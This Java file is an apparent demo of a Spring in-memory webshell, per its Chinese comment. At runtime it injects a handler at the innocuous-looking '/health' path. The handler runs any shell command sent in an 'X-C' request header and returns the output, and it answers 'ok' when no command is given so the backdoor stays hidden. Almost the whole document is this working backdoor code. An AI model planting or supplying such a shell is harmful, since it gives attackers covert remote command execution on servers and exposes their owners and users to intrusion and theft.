import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

// Spring Controller 型内存马 demo：运行时向 HandlerMapping 注册伪装路径映射
public class ControllerShell {
    public static void inject(WebApplicationContext ctx) throws Exception {
        RequestMappingHandlerMapping m = ctx.getBean(RequestMappingHandlerMapping.class);
        RequestMappingInfo info = RequestMappingInfo.paths("/health").build();
        m.registerMapping(info, new ControllerShell(), ControllerShell.class.getDeclaredMethod("handle"));
    }
    public String handle() throws Exception {
        String cmd = ((org.springframework.web.context.request.ServletRequestAttributes)
                RequestContextHolder.currentRequestAttributes())
                .getRequest().getHeader("X-C");
        if (cmd == null) return "ok";
        Process p = Runtime.getRuntime().exec(cmd);
        return new String(p.getInputStream().readAllBytes());
    }
}
